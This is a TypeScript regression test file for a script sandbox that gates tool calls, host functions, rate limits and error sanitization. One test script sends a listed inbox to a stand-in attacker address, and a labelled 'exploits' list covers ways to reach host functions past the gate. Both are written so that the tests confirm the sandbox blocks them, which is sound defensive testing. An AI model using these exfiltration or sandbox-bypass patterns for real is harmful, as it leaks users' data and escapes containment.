/**
 * Tool-Call Gate Regression Tests
 *
 * A script reaches the host through two doors: `callTool()` and functions the host passes in
 * `globals` (with `allowFunctionsInGlobals`). Only `callTool()` used to go through the enclave's
 * operation gate (tool-call cap, rate limit, suspicious-sequence detectors, result sanitization).
 * A host that exposed its tools as functions (`mail.send(...)`) lost every one of those limits,
 * and whatever those functions returned reached the script unsanitized.
 *
 * These tests lock in:
 * - `toolNamespaces`: first-class `ns.method(args)` bindings that are plain `callTool()` calls,
 *   counted, rate-limited, pattern-checked and sanitized like any other tool call;
 * - host-function globals: every call is gated (abort, `maxGlobalFunctionCalls`, the shared rate
 *   limit in double-VM mode) and its return value is sanitized like a tool result;
 * - `callTool(name, args, { throwOnError: false })` (and the same option on namespace methods)
 *   returns `{ success, data | error }` instead of throwing, with no host stack or host object.
 *
 * @packageDocumentation
 */

import { Enclave } from '../enclave';
import type { CreateEnclaveOptions, ToolHandler } from '../types';

type AdapterCase = { name: string; options: CreateEnclaveOptions };

const DOUBLE_VM: AdapterCase = { name: 'double VM', options: {} };
const SINGLE_VM: AdapterCase = { name: 'single VM', options: { doubleVm: { enabled: false } } };
const WORKER_POOL: AdapterCase = {
  name: 'worker_threads',
  options: {
    adapter: 'worker_threads',
    doubleVm: { enabled: false },
    memoryLimit: 0,
    workerPoolConfig: { minWorkers: 1, maxWorkers: 1, warmOnInit: true, memoryLimitPerWorker: 0 },
  },
};

/** Adapters that can receive host functions through `globals`. */
const IN_PROCESS_ADAPTERS = [DOUBLE_VM, SINGLE_VM];
/** Every adapter the Enclave can run a script on. */
const ALL_ADAPTERS = [DOUBLE_VM, SINGLE_VM, WORKER_POOL];

/** Anything that looks like a host file location: an absolute path or `file.ext:line:col`. */
const HOST_LOCATION = /(\/[\w.@-]+){2,}|\\[\w.@-]+\\|\.[cm]?[jt]s:\d+|:\d+:\d+/;

const created: Enclave[] = [];

function makeEnclave(adapter: AdapterCase, options: CreateEnclaveOptions): Enclave {
  const enclave = new Enclave({ ...adapter.options, ...options });
  created.push(enclave);
  return enclave;
}

beforeAll(() => {
  // The single-VM and worker cases disable the double VM on purpose; keep its warning quiet.
  jest.spyOn(console, 'warn').mockImplementation(() => undefined);
});

afterAll(() => {
  jest.restoreAllMocks();
});

afterEach(() => {
  while (created.length > 0) {
    created.pop()?.dispose();
  }
});

jest.setTimeout(30000);

describe('toolNamespaces', () => {
  describe.each(ALL_ADAPTERS)('$name', (adapter) => {
    it('routes ns.method(args) to the tool handler as callTool("ns.method", args)', async () => {
      const calls: Array<[string, Record<string, unknown>]> = [];
      const toolHandler: ToolHandler = async (name, args) => {
        calls.push([name, args]);
        return { name, sum: (Number(args['a']) || 0) + (Number(args['b']) || 0) };
      };
      const enclave = makeEnclave(adapter, { toolHandler, toolNamespaces: { math: ['add', 'multiply'] } });

      const result = await enclave.run(`
        const m = math;
        const { multiply } = math;
        const a = await math.add({ a: 1, b: 2 });
        const b = await m.add({ a: 3, b: 4 });
        const c = await multiply();
        return [a.sum, b.sum, c.name];
      `);

      expect(result.error).toBeUndefined();
      expect(result.success).toBe(true);
      expect(result.value).toEqual([3, 7, 'math.multiply']);
      expect(calls).toEqual([
        ['math.add', { a: 1, b: 2 }],
        ['math.add', { a: 3, b: 4 }],
        ['math.multiply', {}],
      ]);
      expect(result.stats.toolCallCount).toBe(3);
    });

    it('maps methods to explicit tool names', async () => {
      const calls: string[] = [];
      const enclave = makeEnclave(adapter, {
        toolHandler: async (name) => {
          calls.push(name);
          return 'ok';
        },
        toolNamespaces: { users: { list: 'users:list', getById: 'users:get' } },
      });

      const result = await enclave.run(`
        await users.list({});
        return await users.getById({ id: 1 });
      `);

      expect(result.success).toBe(true);
      expect(result.value).toBe('ok');
      expect(calls).toEqual(['users:list', 'users:get']);
    });

    it('counts namespace calls toward maxToolCalls', async () => {
      let handled = 0;
      const enclave = makeEnclave(adapter, {
        maxToolCalls: 2,
        toolHandler: async () => {
          handled++;
          return 1;
        },
        toolNamespaces: { math: ['add'] },
      });

      const result = await enclave.run(`
        await math.add({});
        await math.add({});
        await math.add({});
        return 'done';
      `);

      expect(result.success).toBe(false);
      expect(result.error?.message).toMatch(/tool call limit/i);
      expect(handled).toBe(2);
    });

    it('exposes frozen, prototype-free namespace objects that hold no host references', async () => {
      const enclave = makeEnclave(adapter, {
        // The validator refuses Object.getPrototypeOf; this test inspects the runtime objects.
        validate: false,
        toolHandler: async () => 1,
        toolNamespaces: { math: ['add', 'multiply'] },
      });

      const result = await enclave.run(`
        return {
          keys: Object.keys(math),
          proto: Object.getPrototypeOf(math) === null,
          frozen: Object.isFrozen(math),
          kind: typeof math.add,
        };
      `);

      expect(result.error).toBeUndefined();
      expect(result.value).toEqual({ keys: ['add', 'multiply'], proto: true, frozen: true, kind: 'function' });
    });

    it('allows methods named like string and regex methods', async () => {
      const methods = ['search', 'match', 'matchAll', 'replace', 'replaceAll', 'split', 'test', 'exec'];
      const enclave = makeEnclave(adapter, {
        toolHandler: async (name, args) => ({ name, q: args['q'] }),
        toolNamespaces: { web: methods },
      });

      const result = await enclave.run(`
        const out = [];
        ${methods.map((m) => `out.push(await web.${m}({ q: '${m}' }));`).join('\n')}
        out.push(await web.search());
        return out;
      `);

      expect(result.error).toBeUndefined();
      expect(result.value).toEqual([
        ...methods.map((m) => ({ name: `web.${m}`, q: m })),
        { name: 'web.search', q: undefined },
      ]);
    });

    it('supports { throwOnError: false } on namespace methods', async () => {
      const enclave = makeEnclave(adapter, {
        toolHandler: async () => {
          throw new Error('mailbox unavailable');
        },
        toolNamespaces: { mail: ['archive'] },
      });

      const result = await enclave.run(`
        const r = await mail.archive({ id: 1 }, { throwOnError: false });
        return { success: r.success, message: r.error.message, toolName: r.error.toolName };
      `);

      expect(result.success).toBe(true);
      expect(result.value).toEqual({
        success: false,
        message: expect.stringContaining('mailbox unavailable'),
        toolName: 'mail.archive',
      });
    });
  });

  describe('double VM gate', () => {
    it('runs namespace calls through the suspicious-sequence detectors', async () => {
      const calls: string[] = [];
      const enclave = makeEnclave(DOUBLE_VM, {
        toolHandler: async (name) => {
          calls.push(name);
          return [{ id: 1 }];
        },
        toolNamespaces: { mail: ['list', 'send'] },
      });

      const result = await enclave.run(`
        const inbox = await mail.list({});
        await mail.send({ to: 'attacker@example.com', body: JSON.stringify(inbox) });
        return 'sent';
      `);

      expect(result.success).toBe(false);
      expect(result.error?.message).toMatch(/EXFIL_LIST_SEND/);
      expect(calls).toEqual(['mail.list']);
    });

    it('rate-limits namespace calls', async () => {
      let handled = 0;
      const enclave = makeEnclave(DOUBLE_VM, {
        toolHandler: async () => {
          handled++;
          return 1;
        },
        toolNamespaces: { math: ['add'] },
        doubleVm: { parentValidation: { maxOperationsPerSecond: 5 } },
      });

      const result = await enclave.run(`
        for (let i = 0; i < 20; i++) {
          await math.add({ i });
        }
        return 'done';
      `);

      expect(result.success).toBe(false);
      expect(result.error?.message).toMatch(/rate limit exceeded/i);
      expect(handled).toBe(5);
    });
  });

  describe('configuration', () => {
    const unsafe: Array<[string, unknown]> = [
      ['a prototype key as namespace', JSON.parse('{"__proto__": ["list"]}')],
      ['constructor as namespace', { constructor: ['list'] }],
      ['prototype as namespace', { prototype: ['list'] }],
      ['constructor as method', { mail: ['constructor'] }],
      ['__proto__ as method', { mail: ['__proto__'] }],
      ['prototype as method', { mail: ['prototype'] }],
      ['a reserved word as namespace', { delete: ['all'] }],
      ['a reserved runtime prefix', { __safe_mail: ['list'] }],
      ['a non-identifier namespace', { 'mail-box': ['list'] }],
      ['a non-identifier method', { mail: ['list-all'] }],
      ['an AgentScript global', { callTool: ['list'] }],
      ['a built-in the sandbox provides', { Math: ['max'] }],
      ['a name the validator refuses', { process: ['list'] }],
      ['a method name the validator refuses', { http: ['fetch'] }],
      ['a duplicated method', { mail: ['list', 'list'] }],
      ['an empty tool name', { mail: { list: '' } }],
      ['a non-string method list', { mail: [1] }],
      ['a non-object spec', ['mail.list']],
    ];

    it.each(unsafe)('refuses %s', (_label, toolNamespaces) => {
      expect(() => new Enclave({ toolNamespaces: toolNamespaces as CreateEnclaveOptions['toolNamespaces'] })).toThrow(
        /toolNamespaces/,
      );
    });

    it('refuses a namespace that collides with a custom global', () => {
      expect(() => new Enclave({ globals: { mail: 'x' }, toolNamespaces: { mail: ['list'] } })).toThrow(
        /toolNamespaces/,
      );
    });
  });
});

describe('host-function globals', () => {
  describe.each(IN_PROCESS_ADAPTERS)('$name', (adapter) => {
    it('caps calls with maxGlobalFunctionCalls', async () => {
      let hostCalls = 0;
      const enclave = makeEnclave(adapter, {
        allowFunctionsInGlobals: true,
        maxGlobalFunctionCalls: 3,
        globals: {
          notify: () => {
            hostCalls++;
            return 'ok';
          },
        },
      });

      const result = await enclave.run(`
        for (let i = 0; i < 5; i++) {
          notify();
        }
        return 'done';
      `);

      expect(result.success).toBe(false);
      expect(result.error?.message).toMatch(/global function call limit/i);
      expect(hostCalls).toBe(3);
    });

    it('does not spend the tool-call budget', async () => {
      const enclave = makeEnclave(adapter, {
        allowFunctionsInGlobals: true,
        maxToolCalls: 1,
        toolHandler: async () => 'tool',
        globals: { describeTool: (name: string) => ({ name }) },
      });

      const result = await enclave.run(`
        const a = describeTool('a');
        const b = describeTool('b');
        const t = await callTool('x', {});
        return [a.name, b.name, t];
      `);

      expect(result.success).toBe(true);
      expect(result.value).toEqual(['a', 'b', 'tool']);
    });

    it('sanitizes return values like tool results (no functions reach the script)', async () => {
      const enclave = makeEnclave(adapter, {
        allowFunctionsInGlobals: true,
        globals: { makeClient: () => ({ id: 1, run: () => 'host code' }) },
      });

      const result = await enclave.run(`
        try {
          const client = makeClient();
          return typeof client.run;
        } catch (e) {
          return 'refused';
        }
      `);

      expect(result.success).toBe(true);
      expect(result.value).toBe('refused');
    });

    it('keeps plain data helpers working, sync and async', async () => {
      const enclave = makeEnclave(adapter, {
        allowFunctionsInGlobals: true,
        globals: {
          getTool: (name: string) => ({ name, inputSchema: { type: 'object', required: ['id'] } }),
          lookup: async (id: number) => ({ id, found: true }),
          api: { users: { count: () => 42 } },
        },
      });

      const result = await enclave.run(`
        const meta = getTool('users:list');
        const found = await lookup(7);
        return [meta.name, meta.inputSchema.required[0], found.id, found.found, api.users.count()];
      `);

      expect(result.error).toBeUndefined();
      expect(result.value).toEqual(['users:list', 'id', 7, true, 42]);
    });

    it('keeps built-in methods of data globals working, outside the global-function budget', async () => {
      const enclave = makeEnclave(adapter, {
        maxGlobalFunctionCalls: 0,
        globals: {
          cfg: { items: [1, 2, 3], users: [{ name: 'a' }, { name: 'b' }], when: new Date(0) },
          lookup: new Map([['k', { v: 1 }]]),
          tags: new Set(['a']),
          stamps: [new Date(0)],
        },
      });

      const result = await enclave.run(`
        let sum = 0;
        for (const x of cfg.items) {
          sum += x;
        }
        return {
          sum,
          doubled: cfg.items.map((x) => x * 2),
          names: cfg.users.map((u) => u.name).join(','),
          iso: cfg.when.toISOString(),
          has: cfg.items.includes(2),
          looked: lookup.get('k').v,
          tagged: tags.has('a'),
          stamp: stamps[0].getTime(),
        };
      `);

      expect(result.error).toBeUndefined();
      expect(result.value).toEqual({
        sum: 6,
        doubled: [2, 4, 6],
        names: 'a,b',
        iso: '1970-01-01T00:00:00.000Z',
        has: true,
        looked: 1,
        tagged: true,
        stamp: 0,
      });
    });

    it('gates call, apply and bind on host functions', async () => {
      let hostCalls = 0;
      const enclave = makeEnclave(adapter, {
        allowFunctionsInGlobals: true,
        maxGlobalFunctionCalls: 2,
        globals: {
          notify: (n: number) => {
            hostCalls++;
            return n;
          },
        },
      });

      const result = await enclave.run(`
        const a = notify.call(null, 1);
        const b = notify.apply(null, [2]);
        let bound = 'none';
        try {
          bound = typeof notify.bind(null);
        } catch (e) {
          bound = 'refused';
        }
        return { a, b, bound };
      `);

      expect(result.error).toBeUndefined();
      // The third call (bind) exceeds maxGlobalFunctionCalls, and a bound function could not
      // cross into the sandbox anyway.
      expect(result.value).toEqual({ a: 1, b: 2, bound: 'refused' });
      expect(hostCalls).toBe(2);
    });

    it('refuses to construct host functions', async () => {
      let constructed = 0;
      const enclave = makeEnclave(adapter, {
        allowFunctionsInGlobals: true,
        validate: false,
        globals: {
          Widget: function Widget(this: { made: boolean }) {
            constructed++;
            this.made = true;
          },
        },
      });

      const result = await enclave.run(`
        try {
          const w = new Widget();
          return 'constructed';
        } catch (e) {
          return 'refused';
        }
      `);

      expect(result.value).toBe('refused');
      expect(constructed).toBe(0);
    });

    it('turns errors thrown by host functions into errors without a host stack', async () => {
      const enclave = makeEnclave(adapter, {
        allowFunctionsInGlobals: true,
        globals: {
          explode: () => {
            throw new Error('boom');
          },
        },
      });

      const result = await enclave.run(`
        try {
          explode();
          return 'no error';
        } catch (e) {
          return { message: e.message, stack: String(e.stack) };
        }
      `);

      expect(result.success).toBe(true);
      const value = result.value as { message: string; stack: string };
      expect(value.message).toContain('boom');
      expect(value.stack).not.toMatch(HOST_LOCATION);
    });
  });

  describe('double VM gate', () => {
    it('rate-limits host-function calls with the tool-call rate limit', async () => {
      let hostCalls = 0;
      const enclave = makeEnclave(DOUBLE_VM, {
        allowFunctionsInGlobals: true,
        doubleVm: { parentValidation: { maxOperationsPerSecond: 5 } },
        globals: {
          notify: () => {
            hostCalls++;
            return 'ok';
          },
        },
      });

      const result = await enclave.run(`
        for (let i = 0; i < 20; i++) {
          notify();
        }
        return 'done';
      `);

      expect(result.success).toBe(false);
      expect(result.error?.message).toMatch(/rate limit exceeded/i);
      expect(hostCalls).toBe(5);
    });
  });

  describe('worker_threads', () => {
    it('never hands host functions to the worker sandbox', async () => {
      let hostCalls = 0;
      const enclave = makeEnclave(WORKER_POOL, {
        allowFunctionsInGlobals: true,
        globals: {
          notify: () => {
            hostCalls++;
            return 'ok';
          },
        },
      });

      const result = await enclave.run(`return typeof notify;`);

      expect(result.success).toBe(true);
      expect(result.value).toBe('undefined');
      expect(hostCalls).toBe(0);
    });
  });
});

describe('host functions inside collections in globals', () => {
  // Built-in methods of arrays, Maps, Sets, promises and iterators (forEach, iteration, get, then,
  // next) run on the raw host object and hand its elements straight to the script, where a host
  // function would be called without passing the global-function gate. Such globals are refused
  // when the enclave is constructed.
  class Client {
    constructor(private readonly send: () => string) {}
    run(): string {
      return this.send();
    }
  }

  type Exploit = [label: string, globals: (fn: () => string) => Record<string, unknown>, script: string];
  const exploits: Exploit[] = [
    ['Array#forEach', (fn) => ({ fns: [fn] }), `fns.forEach((f) => f()); return 'called';`],
    ['for…of over an array', (fn) => ({ fns: [fn] }), `for (const f of fns) { f(); } return 'called';`],
    ['Array.from', (fn) => ({ fns: [fn] }), `Array.from(fns)[0](); return 'called';`],
    [
      'a method of an object in an array',
      (fn) => ({ items: [{ run: fn }] }),
      `items.forEach((i) => i.run()); return 'called';`,
    ],
    [
      'a class instance in an array',
      (fn) => ({ items: [new Client(fn)] }),
      `items.forEach((i) => i.run()); return 'called';`,
    ],
    ['Map#forEach', (fn) => ({ handlers: new Map([['send', fn]]) }), `handlers.forEach((f) => f()); return 'called';`],
    ['Map#get', (fn) => ({ handlers: new Map([['send', fn]]) }), `handlers.get('send')(); return 'called';`],
    [
      'iteration over a Map',
      (fn) => ({ handlers: new Map([['send', fn]]) }),
      `for (const [k, f] of handlers) { f(); } return 'called';`,
    ],
    [
      'a Map key',
      (fn) => ({ handlers: new Map([[{ run: fn }, 1]]) }),
      `handlers.forEach((v, k) => k.run()); return 'called';`,
    ],
    ['Set#forEach', (fn) => ({ fns: new Set([fn]) }), `fns.forEach((f) => f()); return 'called';`],
    ['iteration over a Set', (fn) => ({ fns: new Set([fn]) }), `for (const f of fns) { f(); } return 'called';`],
    ['a Promise', (fn) => ({ later: Promise.resolve(fn) }), `const f = await later; f(); return 'called';`],
    ['an iterator', (fn) => ({ it: [fn].values() }), `it.next().value(); return 'called';`],
  ];

  describe.each(ALL_ADAPTERS)('$name', (adapter) => {
    it.each(exploits)('refuses %s at construction', async (_label, makeGlobals, script) => {
      let hostCalls = 0;
      const fn = () => {
        hostCalls++;
        return 'host';
      };

      const attempt = async () => {
        const enclave = makeEnclave(adapter, {
          allowFunctionsInGlobals: true,
          maxGlobalFunctionCalls: 0,
          globals: makeGlobals(fn),
        });
        return enclave.run(script);
      };

      await expect(attempt()).rejects.toThrow(/Custom global "\w+"/);
      expect(hostCalls).toBe(0);
    });
  });

  it('names the offending path', () => {
    const fn = () => 'host';
    expect(() => new Enclave({ allowFunctionsInGlobals: true, globals: { cfg: { hooks: [{ run: fn }] } } })).toThrow(
      /Custom global "cfg" contains a function inside a collection at hooks\.0\.run/,
    );
    expect(
      () => new Enclave({ allowFunctionsInGlobals: true, globals: { handlers: new Map([['send', fn]]) } }),
    ).toThrow(/Custom global "handlers" contains a function inside a collection at get\("send"\)/);
  });

  it('keeps allowing functions outside collections', () => {
    expect(
      () =>
        new Enclave({
          allowFunctionsInGlobals: true,
          globals: { api: { send: () => 'ok' }, client: new Client(() => 'ok') },
        }),
    ).not.toThrow();
  });
});

describe('callTool options', () => {
  describe.each(ALL_ADAPTERS)('$name', (adapter) => {
    it('returns { success: false, error } for a failing tool when throwOnError is false', async () => {
      const enclave = makeEnclave(adapter, {
        toolHandler: async () => {
          throw new Error('upstream refused');
        },
      });

      const result = await enclave.run(`
        const r = await callTool('orders:get', { id: 1 }, { throwOnError: false });
        return {
          success: r.success,
          keys: Object.keys(r.error).sort(),
          message: r.error.message,
          toolName: r.error.toolName,
          stack: String(r.error.stack),
        };
      `);

      expect(result.error).toBeUndefined();
      expect(result.success).toBe(true);
      const value = result.value as Record<string, unknown>;
      expect(value['success']).toBe(false);
      expect(value['message']).toEqual(expect.stringContaining('upstream refused'));
      expect(value['toolName']).toBe('orders:get');
      expect(value['keys']).not.toContain('stack');
      expect(value['stack']).toBe('undefined');
    });

    it('returns { success: true, data } for a working tool when throwOnError is false', async () => {
      const enclave = makeEnclave(adapter, { toolHandler: async (_name, args) => ({ echoed: args['v'] }) });

      const result = await enclave.run(`
        return await callTool('echo', { v: 5 }, { throwOnError: false });
      `);

      expect(result.success).toBe(true);
      expect(result.value).toEqual({ success: true, data: { echoed: 5 } });
    });

    it('keeps throwing by default', async () => {
      const enclave = makeEnclave(adapter, {
        toolHandler: async () => {
          throw new Error('upstream refused');
        },
      });

      const result = await enclave.run(`return await callTool('orders:get', { id: 1 });`);

      expect(result.success).toBe(false);
      expect(result.error?.message).toContain('upstream refused');
    });

    it('still throws when the enclave itself refuses the call', async () => {
      const enclave = makeEnclave(adapter, { maxToolCalls: 1, toolHandler: async () => 'ok' });

      const result = await enclave.run(`
        await callTool('a', {}, { throwOnError: false });
        await callTool('b', {}, { throwOnError: false });
        return 'unreachable';
      `);

      expect(result.success).toBe(false);
      expect(result.error?.message).toMatch(/tool call limit/i);
    });
  });

  describe.each(IN_PROCESS_ADAPTERS)('$name with the string tool bridge payload limit', (adapter) => {
    // 40 KB: a payload between a quarter of it and all of it must pass, as the host allows it.
    const limit: CreateEnclaveOptions = { toolBridge: { mode: 'string', maxPayloadBytes: 40_000 } };

    it('accepts a response within the limit counted in UTF-8 bytes', async () => {
      const enclave = makeEnclave(adapter, {
        ...limit,
        toolHandler: async (name) => {
          if (name === 'ascii') return 'a'.repeat(20_000);
          if (name === 'accented') return 'é'.repeat(15_000); // 30 KB
          return '😀'.repeat(8_000); // 32 KB: four bytes per surrogate pair
        },
      });

      const result = await enclave.run(`
        const a = await callTool('ascii', {});
        const b = await callTool('accented', {});
        const c = await callTool('emoji', {});
        return [a.length, b.length, c.length];
      `);

      expect(result.error).toBeUndefined();
      expect(result.value).toEqual([20_000, 15_000, 16_000]);
    });

    it('accepts a request within the limit counted in UTF-8 bytes', async () => {
      const enclave = makeEnclave(adapter, {
        ...limit,
        toolHandler: async (_name, args) => String(args['text']).length,
      });

      const result = await enclave.run(`return await callTool('count', { text: 'a'.repeat(20000) });`);

      expect(result.error).toBeUndefined();
      expect(result.value).toBe(20_000);
    });

    it('reports an oversized response as a tool failure when throwOnError is false', async () => {
      const enclave = makeEnclave(adapter, { ...limit, toolHandler: async () => 'é'.repeat(25_000) }); // 50 KB

      const result = await enclave.run(`
        const r = await callTool('big', {}, { throwOnError: false });
        return { success: r.success, toolName: r.error.toolName, code: r.error.code };
      `);

      expect(result.error).toBeUndefined();
      expect(result.value).toEqual({ success: false, toolName: 'big', code: 'TOOL_BRIDGE_RESPONSE_TOO_LARGE' });
    });

    it('still refuses a request over the limit', async () => {
      const enclave = makeEnclave(adapter, { ...limit, toolHandler: async () => 'unreachable' });

      const result = await enclave.run(`
        return await callTool('big', { text: 'é'.repeat(25000) }, { throwOnError: false });
      `);

      expect(result.success).toBe(false);
      expect(result.error?.message).toMatch(/Tool request exceeds maximum size/);
    });
  });

  describe.each(IN_PROCESS_ADAPTERS)('$name with the direct tool bridge', (adapter) => {
    const direct: CreateEnclaveOptions = { toolBridge: { mode: 'direct', acknowledgeInsecureDirect: true } };

    it('returns tool failures and successes as results when throwOnError is false', async () => {
      const enclave = makeEnclave(adapter, {
        ...direct,
        toolHandler: async (name) => {
          if (name === 'fail') throw new Error('upstream refused');
          return { ok: true };
        },
      });

      const result = await enclave.run(`
        const bad = await callTool('fail', {}, { throwOnError: false });
        const good = await callTool('ok', {}, { throwOnError: false });
        return { bad: [bad.success, bad.error.toolName, bad.error.message], good };
      `);

      expect(result.error).toBeUndefined();
      expect(result.value).toEqual({
        bad: [false, 'fail', expect.stringContaining('upstream refused')],
        good: { success: true, data: { ok: true } },
      });
    });
  });
});
